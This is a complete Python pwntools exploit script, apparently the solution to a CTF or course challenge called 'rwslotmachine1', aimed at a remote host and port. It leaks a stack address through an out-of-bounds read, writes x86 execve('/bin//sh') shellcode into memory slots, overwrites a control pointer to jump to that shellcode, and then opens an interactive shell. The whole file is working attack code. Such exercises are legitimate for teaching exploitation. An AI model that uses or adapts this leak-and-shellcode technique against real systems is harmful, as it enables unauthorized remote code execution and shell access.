from pwn import *

local = False
# Both solutions work against the Docker container instance.
# Only solution 2 works locally.
# Solution 1 fails on the local machine because there is no valid address at that index.
SOLUTION = 1

if local:
	p = process('../src/rwslotmachine1')
else:
	p = remote('141.85.224.117', 31344)

def do_read(idx):
	p.recvuntil('>')
	p.sendline('1')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil(']: ')
	return int(p.recvuntil('\n')[:-1], 16)

def do_write(idx, value):
	p.recvuntil('>')
	p.sendline('2')
	p.recvuntil('index:')
	p.sendline(str(idx))
	p.recvuntil('value:')
	p.sendline(hex(value))

if SOLUTION == 1:
	stack_leak = do_read(1)
	stack_slots = stack_leak - 0x3e
else:
	stack_leak = do_read(-7)
	stack_slots = stack_leak

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
shellcode_pieces = unpack_many(shellcode, 32)

for i in range(len(shellcode_pieces)):
	do_write(i, shellcode_pieces[i])

do_write(-8, stack_slots)

p.interactive()
